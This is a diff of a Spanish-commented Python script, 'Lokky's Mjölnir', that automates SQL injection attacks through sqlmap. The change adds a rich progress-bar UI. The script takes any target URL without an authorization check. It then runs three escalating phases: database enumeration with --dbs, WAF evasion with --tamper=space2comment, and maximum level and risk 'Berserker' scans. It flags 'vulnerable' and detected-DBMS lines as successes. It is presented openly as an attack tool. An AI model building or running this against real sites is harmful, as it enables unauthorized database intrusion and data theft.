@@ -3,42 +3,57 @@ import sys
 import shutil
 import os
 import time
-import signal
-from typing import Final, List, Iterator, Optional, Dict, Generator, Any
+from typing import Final, List, Iterator, Optional, Generator, Any
 from dataclasses import dataclass, field
 from functools import wraps
 from datetime import datetime
 
-# --- 1. Decoradores: Lógica Transversal ---
+# --- LIBRERÍAS DE UI (Nivel Dios) ---
+try:
+    from rich.console import Console
+    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
+    from rich.panel import Panel
+    from rich.text import Text
+    from rich.theme import Theme
+except ImportError:
+    print("❌ Error: Falta el arsenal. Ejecuta: pip install rich")
+    sys.exit(1)
+
+# Configuración de tema personalizado para una estética 'Hacker' pero legible
+custom_theme = Theme({
+    "info": "cyan",
+    "warning": "yellow",
+    "error": "bold red",
+    "success": "bold green",
+    "phase": "bold magenta"
+})
+console = Console(theme=custom_theme)
+
+# --- 1. Decoradores ---
 
 def audit_execution(phase_name: str):
-    """
-    Decorador 'Pro' para medir el rendimiento y loguear el ciclo de vida
-    de cada fase de ataque sin ensuciar la lógica de negocio.
-    """
+    """Mide rendimiento y gestiona el ciclo de vida sin ensuciar la UI."""
     def decorator(func):
         @wraps(func)
         def wrapper(*args, **kwargs) -> Any:
-            print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 🚀 INICIANDO PROTOCOLO: {phase_name.upper()}")
+            # Ya no hacemos print aquí para no romper la barra de progreso
             start_time = time.perf_counter()
             try:
-                result = func(*args, **kwargs)
-                return result
+                return func(*args, **kwargs)
             except Exception as e:
-                print(f"[!] Excepción crítica en {phase_name}: {e}")
+                console.print(f"[error]💥 Excepción en {phase_name}: {e}[/error]")
                 raise
             finally:
                 elapsed = time.perf_counter() - start_time
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] 🏁 FIN PROTOCOLO {phase_name}. Tiempo: {elapsed:.2f}s")
-                print("-" * 60)
+                # Este log saldrá limpio al final de la fase
+                console.print(f"[dim]🏁 {phase_name} finalizado en {elapsed:.2f}s[/dim]")
         return wrapper
     return decorator
 
-# --- 2. Estructuras de Datos Inmutables ---
+# --- 2. Estructuras de Datos ---
 
 @dataclass(frozen=True)
 class PhaseConfig:
-    """Blueprint inmutable para definir una fase de ataque."""
     name: str
     level: int
     risk: int
@@ -48,141 +63,113 @@ class PhaseConfig:
     def cmd_signature(self) -> str:
         return f"L{self.level}::R{self.risk}::{self.name}"
 
-# --- 3. El Core: Arquitectura Orientada a Objetos y Generadores ---
+# --- 3. El Core: Mjolnir Engine ---
 
 class SqlMapArchitect:
-    """
-    Orquestador de ataques SQL Injection.
-    Usa patrones de diseño para desacoplar la estrategia de la ejecución.
-    """
-
     def __init__(self, target_url: str):
         self.target: Final[str] = self._sanitize_target(target_url)
         self._binary: Final[Optional[str]] = shutil.which("sqlmap")
         
         if not self._binary:
-            raise EnvironmentError("❌ SQLMap no encontrado en el PATH. Instálalo, primer aviso.")
+            raise EnvironmentError("❌ SQLMap no encontrado. Instálalo.")
 
     @staticmethod
     def _sanitize_target(url: str) -> str:
-        """Sanitización estricta usando comprensión de listas."""
         return "".join(ch for ch in url if ord(ch) >= 32).strip()
 
     def _strategy_generator(self) -> Generator[PhaseConfig, None, None]:
-        """
-        Generador (yield) que define la escalada de privilegios.
-        CORRECCIÓN: De menos a más. Primero sigilo, luego fuerza bruta.
-        """
-        # Fase 1: Rápida y Silenciosa (Smart Scan)
-        yield PhaseConfig(
-            name="Infiltración Ghost (Recon)", 
-            level=1, 
-            risk=1, 
-            flags=["--smart", "--batch", "--random-agent", "--dbs"]
-        )
-        # Fase 2: Específica y Táctica (Si la 1 falla o para profundizar)
-        yield PhaseConfig(
-            name="Asalto Táctico (Heurística)", 
-            level=3, 
-            risk=2, 
-            flags=["--batch", "--tamper=space2comment", "--threads=5", "--forms"]
-        )
-        # Fase 3: Ruido Máximo (Solo si estás desesperado)
-        yield PhaseConfig(
-            name="Demolición Berserker (Full Noise)", 
-            level=5, 
-            risk=3, 
-            flags=["--batch", "--level=5", "--risk=3", "--random-agent", "--hex"]
-        )
+        yield PhaseConfig("Infiltración Ghost (Recon)", 1, 1, ["--smart", "--batch", "--random-agent", "--dbs"])
+        yield PhaseConfig("Asalto Táctico (Heurística)", 3, 2, ["--batch", "--tamper=space2comment", "--threads=5"])
+        yield PhaseConfig("Demolición Berserker (Full Noise)", 5, 3, ["--batch", "--level=5", "--risk=3", "--random-agent"])
 
     def _execute_subprocess(self, cmd: List[str]) -> Iterator[str]:
-        """
-        Closure que encapsula la ejecución del proceso y cede el control (yield)
-        línea por línea para análisis en tiempo real (Non-blocking I/O).
-        """
         process = subprocess.Popen(
-            cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=1,
-            universal_newlines=True
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1, universal_newlines=True
         )
-        
-        # Stream output in real-time
         if process.stdout:
             for line in process.stdout:
                 yield line.strip()
-        
         process.wait()
         if process.returncode != 0:
-            raise subprocess.CalledProcessError(process.returncode, cmd)
+            # No lanzamos error aquí para permitir que el script maneje el fallo visualmente
+            yield f"ERROR_CODE_{process.returncode}"
 
     def engage(self) -> None:
-        """Bucle principal de ejecución."""
-        print(f"🎯 TARGET LOCKED: {self.target}\n")
+        console.print(Panel(f"[bold blue]TARGET LOCKED:[/bold blue] [white]{self.target}[/white]", expand=False))
 
         for phase in self._strategy_generator():
-            self._run_phase(phase)
+            self._run_phase_with_ui(phase)
 
     @audit_execution("Phase Runner")
-    def _run_phase(self, phase: PhaseConfig) -> None:
-        """Construye y lanza el comando para una fase específica."""
-        
-        # Construcción dinámica del comando
-        command: List[str] = [
-            self._binary, # type: ignore
-            "-u", self.target
-        ] + [f"--level={phase.level}", f"--risk={phase.risk}"] + phase.flags
+    def _run_phase_with_ui(self, phase: PhaseConfig) -> None:
+        command = [self._binary, "-u", self.target] + \
+                  [f"--level={phase.level}", f"--risk={phase.risk}"] + phase.flags
 
-        print(f"🛠️ Ejecutando estrategia: {phase.cmd_signature}")
-        
-        try:
-            # Consumimos el generador del subproceso
-            for log_line in self._execute_subprocess(command):
-                # Filtro de ruido: Solo mostramos info relevante o dejamos que sqlmap hable
-                # Aquí podrías meter lógica de IA para detectar "Vulnerable" y parar.
-                if "CRITICAL" in log_line or "ERROR" in log_line:
-                    print(f"🔴 {log_line}")
-                elif "information" in log_line.lower():
-                     print(f"🟢 {log_line}")
-                else:
-                    # Opcional: imprimir todo o silenciar ruido
-                    # print(f"  Running... {log_line[:50]}", end='\r') 
-                    pass 
+        console.print(f"\n[phase]🚀 INICIANDO FASE: {phase.cmd_signature}[/phase]")
 
-        except subprocess.CalledProcessError:
-            print(f"⚠️ La fase {phase.name} falló o fue bloqueada por WAF.")
-        except KeyboardInterrupt:
-            print("\n🛑 Abortando manualmente...")
-            raise # Re-lanzamos para salir del bucle principal
+        # --- AQUÍ ESTÁ LA MAGIA VISUAL ---
+        # Usamos 'Progress' de rich para crear una barra indeterminada (pulse)
+        with Progress(
+            SpinnerColumn("aesthetic"),      # Spinner guapo
+            TextColumn("[bold blue]{task.description}"), # Qué está pasando
+            BarColumn(bar_width=None),       # La barra que rebota (pulse)
+            TimeElapsedColumn(),             # Tiempo transcurrido
+            transient=True,                  # Desaparece al acabar para limpiar pantalla
+            console=console
+        ) as progress:
+            
+            # Tarea "indeterminada" (total=None)
+            task_id = progress.add_task(f"Inicializando {phase.name}...", total=None)
+
+            try:
+                for log_line in self._execute_subprocess(command):
+                    # Actualizamos la descripción de la barra con la última línea de log real
+                    # Limpiamos un poco el texto para que quepa
+                    clean_log = log_line.replace("[INFO]", "").replace("[WARNING]", "⚠️").strip()
+                    if len(clean_log) > 80: clean_log = clean_log[:77] + "..."
+                    
+                    progress.update(task_id, description=f"[cyan]{clean_log}")
+
+                    # Filtros de eventos importantes para imprimir persistente
+                    if "CRITICAL" in log_line or "ERROR" in log_line:
+                        console.print(f"[error]🔴 {log_line}[/error]")
+                        # Si es un error de parámetros, paramos esta fase pronto
+                        if "no parameter" in log_line or "no forms" in log_line:
+                            progress.stop()
+                            break
+                            
+                    elif "vulnerable" in log_line.lower() or "injection" in log_line.lower():
+                        console.print(Panel(f"[success]🎉 EUREKA: {log_line}[/success]"))
+                    
+                    elif "database management system" in log_line.lower():
+                         console.print(f"[success]✅ DBMS DETECTADO: {log_line}[/success]")
+
+            except Exception as e:
+                console.print(f"[error]⚠️ Error de ejecución: {e}[/error]")
 
 # --- 4. Entry Point ---
 
 def main():
     os.system('clear' if os.name == 'posix' else 'cls')
-    print("""
-    ███╗   ███╗██╗██████╗ ██╗     ███╗   ██╗██╗██████╗ 
-    ████╗ ████║██║██╔══██╗██║     ████╗  ██║██║██╔══██╗
-    ██╔████╔██║██║██║  ██║██║     ██╔██╗ ██║██║██████╔╝
-    ██║╚██╔╝██║██║██║  ██║██║     ██║╚██╗██║██║██╔══██╗
-    ██║ ╚═╝ ██║██║██████╔╝███████╗██║ ╚████║██║██║  ██║
-    ╚═╝     ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
-           >> ARCHITECT EDITION v2.0 <<
-    """)
+    
+    # Header con estilo usando Rich
+    title = Text("🔨 LOKKY'S MJÖLNIR - ARCHITECT UI EDITION v3.0", justify="center", style="bold white on blue")
+    console.print(Panel(title))
 
     try:
-        target = input("🔥 Introduce URL Objetivo: ").strip()
+        target = console.input("[bold green]🔥 Introduce URL Objetivo: [/bold green]").strip()
         if not target:
-            print("😒 En serio? Dame una URL."); sys.exit(1)
+            console.print("[bold red]😒 Venga, no tengo todo el día. Dame una URL.[/bold red]")
+            sys.exit(1)
         
         bot = SqlMapArchitect(target)
         bot.engage()
 
     except KeyboardInterrupt:
-        print("\n👋 Saliendo. Happy Hacking.")
+        console.print("\n[bold yellow]👋 Abortando misión. Cambio y corto.[/bold yellow]")
     except Exception as e:
-        print(f"\n💥 Error fatal no controlado: {e}")
+        console.print(f"\n[bold red]💥 Error fatal: {e}[/bold red]")
 
 if __name__ == "__main__":
     main()
